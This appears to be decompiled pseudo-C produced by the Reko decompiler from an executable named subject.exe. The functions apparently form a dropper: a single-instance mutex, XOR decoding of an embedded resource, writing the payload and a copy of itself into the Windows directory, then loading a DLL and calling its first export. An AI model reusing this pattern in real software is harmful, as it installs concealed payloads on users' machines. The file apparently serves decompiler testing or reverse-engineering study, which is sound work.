// subject_000000E1.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

Eq_3 g_t403000 = // 00403000
	{
		0x30B4
	};
Eq_3 g_t403008 = // 00403008
	{
		0x3074
	};
Eq_3 g_t4030E4 = // 004030E4
	{
		0x00
	};
Eq_3 g_t4030E8 = // 004030E8
	{
		0x00
	};
// subject_000001BD.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__CloseHandle = &g_t20C4; // 00402000
<anonymous> * __imp__WriteFile = &g_t20D1; // 00402004
<anonymous> * __imp__CreateFileA = &g_t20DC; // 00402008
<anonymous> * __imp__SizeofResource = &g_t20E9; // 0040200C
<anonymous> * __imp__LockResource = &g_t20F9; // 00402010
<anonymous> * __imp__LoadResource = &g_t2107; // 00402014
<anonymous> * __imp__FindResourceA = &g_t2115; // 00402018
<anonymous> * __imp__GetModuleHandleA = &g_t2124; // 0040201C
<anonymous> * __imp__CopyFileA = &g_t2136; // 00402020
<anonymous> * __imp__lstrcatA = &g_t2141; // 00402024
<anonymous> * __imp__GetWindowsDirectoryA = &g_t214B; // 00402028
<anonymous> * __imp__GetModuleFileNameA = &g_t2161; // 0040202C
<anonymous> * __imp__GetProcAddress = &g_t2175; // 00402030
<anonymous> * __imp__LoadLibraryA = &g_t2185; // 00402034
<anonymous> * __imp__GetTickCount = &g_t2193; // 00402038
<anonymous> * __imp__GetLastError = &g_t21A1; // 0040203C
<anonymous> * __imp__CreateMutexA = &g_t21AF; // 00402040
word32 g_dw402070 = 8388; // 00402070
word32 g_dw402074 = 0x20D1; // 00402074
word32 g_dw402078 = 0x20DC; // 00402078
word32 g_dw40207C = 0x20E9; // 0040207C
word32 g_dw402080 = 8441; // 00402080
word32 g_dw402084 = 8455; // 00402084
word32 g_dw402088 = 0x2115; // 00402088
word32 g_dw40208C = 8484; // 0040208C
word32 g_dw402090 = 0x2136; // 00402090
word32 g_dw402094 = 0x2141; // 00402094
word32 g_dw402098 = 0x214B; // 00402098
word32 g_dw40209C = 0x2161; // 0040209C
word32 g_dw4020A0 = 8565; // 004020A0
word32 g_dw4020A4 = 8581; // 004020A4
word32 g_dw4020A8 = 8595; // 004020A8
word32 g_dw4020AC = 0x21A1; // 004020AC
word32 g_dw4020B0 = 0x21AF; // 004020B0
// subject_00000202.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register ui32 fn00401000()
// Called from:
//      fn00401028
ui32 fn00401000()
{
	Eq_3 eax_7 = g_t4030E8.u1 *s 0x000343FD + 2531011;
	g_t4030E8.u1 = (BOOL) eax_7;
	return eax_7 >> 0x10 & 0x7FFF;
}

// 0040101E: void fn0040101E(Stack Eq_3 dwArg04)
// Called from:
//      Win32CrtStartup
void fn0040101E(Eq_3 dwArg04)
{
	g_t4030E8.u1 = (BOOL) dwArg04;
}

// 00401028: Register ptr32 fn00401028(Register word32 ecx, Stack Eq_3 wArg04, Stack Eq_3 dwArg08)
// Called from:
//      fn004010DA
ptr32 fn00401028(word32 ecx, Eq_3 wArg04, Eq_3 dwArg08)
{
	ptr32 fp;
	ptr32 ebp;
	Eq_3 tLoc08;
	tLoc08.u3 = ecx;
	tLoc08.u3 = 0x00;
	Eq_32 eax_24 = GetModuleHandleA(0x00);
	Eq_38 eax_34 = FindResourceA(eax_24, (word32) wArg04, 0x004030C8);
	Eq_47 eax_45 = LockResource(LoadResource(eax_24, eax_34));
	word16 wArg04_204 = (word16) eax_45;
	if (eax_45 != 0x00)
	{
		Eq_3 eax_54 = SizeofResource(eax_24, eax_34);
		Eq_3 eax_72 = CreateFileA(dwArg08, 0x40000000, 0x00, null, 0x02, 0x80, 0x00);
		dwArg08 = eax_72;
		if (eax_72 != ~0x00)
		{
			Eq_3 ebx_100 = 0x00;
			if (eax_54 > 0x00)
			{
				do
				{
					Mem98[ebx_100 + eax_45:byte] = Mem93[ebx_100 + eax_45:byte] ^ SLICE(CONVERT(fn00401000(), word32, int64) %s 0x0100, byte, 0);
					ebx_100.u3 = (word32) ebx_100 + 1;
				} while (ebx_100 < eax_54);
			}
			WriteFile(eax_72, eax_45, eax_54, &tLoc08, null);
			CloseHandle(eax_72);
			return ebp;
		}
	}
	word32 edx_156;
	g_t4010D5();
	return fp - 4;
}

<anonymous> g_t4010D5 = <code>; // 004010D5
// 004010DA: void fn004010DA(Register word32 ecx)
// Called from:
//      Win32CrtStartup
void fn004010DA(word32 ecx)
{
	ptr32 fp;
	Eq_125 tLoc0C68;
	Eq_125 tLoc0848;
	Eq_125 tLoc0424;
	byte bLoc06;
	byte bLoc0428;
	GetModuleFileNameA(null, &tLoc0C68, 0x0400);
	GetWindowsDirectoryA(&tLoc0424, 0x0400);
	GetWindowsDirectoryA(&tLoc0848, 0x0400);
	if (bLoc06 != 0x5C)
		lstrcatA(&tLoc0424, 0x004030E0);
	lstrcatA(&tLoc0424, 0x004030D0);
	ptr32 esp_56 = fp - 0x0C78;
	if (bLoc0428 != 0x5C)
	{
		lstrcatA(&tLoc0848, 0x004030E0);
		esp_56 = fp - 0x0C80;
	}
	struct Eq_174 * esp_72 = esp_56 - 4;
	esp_72->t0000.u1 = g_t403000.u1;
	esp_72->tFFFFFFFC = &tLoc0848;
	lstrcatA(esp_72->tFFFFFFFC, esp_72->t0000.u1);
	esp_72->tFFFFFFF8.u1 = (BOOL) &tLoc0848;
	esp_72->tFFFFFFF4.u1 = (BOOL) 101;
	word32 ebp_89 = fn00401028(ecx, esp_72->tFFFFFFF4.u0, esp_72->tFFFFFFF8.u1);
	esp_72->tFFFFFFF8.u1 = (BOOL) 0x00;
	esp_72->tFFFFFFF4.u1 = (BOOL) (ebp_89 - 0x0420);
	esp_72->tFFFFFFF0.u1 = (BOOL) (ebp_89 + ~0x0C63);
	CopyFileA(esp_72->tFFFFFFF0.u1, esp_72->tFFFFFFF4.u1, esp_72->tFFFFFFF8.u1);
}

// 00401189: Register Eq_3 Win32CrtStartup()
Eq_3 Win32CrtStartup()
{
	g_t4030E4.u1 = (BOOL) CreateMutexA(null, 0x00, g_t403008.u1);
	if (GetLastError() != 0xB7)
	{
		fn0040101E(0x00);
		fn004010DA(0x00);
		struct Eq_280 * esp_30 = (struct Eq_280 *) <invalid>;
		esp_30->tFFFFFFFC.u1 = (BOOL) GetTickCount();
		fn0040101E(esp_30->tFFFFFFFC.u1);
		esp_30->tFFFFFFFC.u1 = g_t403000.u1;
		Eq_32 eax_44 = GetModuleHandleA(esp_30->tFFFFFFFC.u1);
		if (eax_44 == null || eax_44 == (struct HINSTANCE__ *) ~0x00)
		{
			esp_30->tFFFFFFFC.u1 = g_t403000.u1;
			eax_44 = LoadLibraryA(esp_30->tFFFFFFFC.u1);
		}
		if (eax_44 != null && eax_44 != (struct HINSTANCE__ *) ~0x00)
		{
			esp_30->tFFFFFFFC.u1 = (BOOL) 0x01;
			esp_30->tFFFFFFF8 = eax_44;
			Eq_331 eax_71 = GetProcAddress(esp_30->tFFFFFFF8, esp_30->tFFFFFFFC.u1);
			if (eax_71 != null)
				eax_71();
		}
	}
	return 0x00;
}

